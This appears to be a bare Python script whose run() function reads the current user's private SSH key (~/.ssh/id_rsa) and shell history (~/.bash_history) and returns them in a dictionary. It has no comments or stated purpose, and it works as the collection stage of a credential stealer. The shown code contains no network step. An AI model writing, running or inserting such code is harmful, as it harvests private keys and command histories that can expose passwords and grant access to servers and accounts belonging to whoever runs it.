import os

def read_file(path):
    try:
        with open(path, "r") as f:
            return f.read()
    except:
        return None

def run():
    data = {}

    home = os.path.expanduser("~")

    data["bash_history"] = read_file(f"{home}/.bash_history")
    data["ssh_keys"] = read_file(f"{home}/.ssh/id_rsa")

    return data
